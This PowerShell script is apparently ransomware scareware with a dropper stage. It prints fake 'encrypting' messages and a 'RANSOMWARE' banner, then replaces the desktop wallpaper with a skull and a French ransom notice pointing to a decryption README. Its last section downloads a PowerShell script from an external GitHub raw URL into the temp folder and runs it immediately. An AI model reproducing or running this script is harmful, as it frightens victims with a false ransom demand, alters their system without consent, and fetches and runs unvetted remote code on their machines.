# --- EFFET VISUEL ---
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys("%{ENTER}")

$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Red"
Clear-Host


Write-Host "=========================================" -ForegroundColor Red
Write-Host "             RANSOMWARE                  " -ForegroundColor Red
Write-Host "=========================================" -ForegroundColor Red
Write-Host ""
Start-Sleep -Milliseconds 500

1..10 | ForEach-Object {
    Write-Host "[+] Encrypting file_$_.docx" -ForegroundColor Red
    Start-Sleep -Milliseconds 150
}

Write-Host ""
Start-Sleep -Milliseconds 300
Write-Host "[!] ALL FILES ENCRYPTED" -ForegroundColor Yellow
Write-Host ""
Start-Sleep -Milliseconds 800


# --- FOND D'ECRAN TETE DE MORT ---
$wallpaperPath = "$env:TEMP\ransom_wallpaper.png"

Add-Type -AssemblyName System.Drawing

$width = 1920
$height = 1080
$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

# Fond noir
$graphics.Clear([System.Drawing.Color]::Black)

# Tete de mort en grand
$font = New-Object System.Drawing.Font("Segoe UI Emoji", 300)
$brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red)
$skull = "  ☠  "
$fontSkull = New-Object System.Drawing.Font("Arial Unicode MS", 400)
$graphics.DrawString($skull, $fontSkull, $brush, 400, 50)
# Texte ransomware
$fontText = New-Object System.Drawing.Font("Consolas", 40, [System.Drawing.FontStyle]::Bold)
$graphics.DrawString("VOS FICHIERS ONT ETE CHIFFRES", $fontText, $brush, 350, 800)
$fontSmall = New-Object System.Drawing.Font("Consolas", 25)
$brushWhite = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
$graphics.DrawString("Lisez README_DECRYPT.txt pour recuperer vos fichiers", $fontSmall, $brushWhite, 300, 880)

$bitmap.Save($wallpaperPath)
$graphics.Dispose()
$bitmap.Dispose()

# Appliquer le fond d'ecran
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll")]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)


# --- TELECHARGEMENT ET EXECUTION ---
$url = "https://raw.githubusercontent.com/asmaerouel/MesTest/refs/heads/main/test1.ps1"
$file = "$env:TEMP\github-script.ps1"
Invoke-WebRequest -Uri $url -OutFile $file
& $file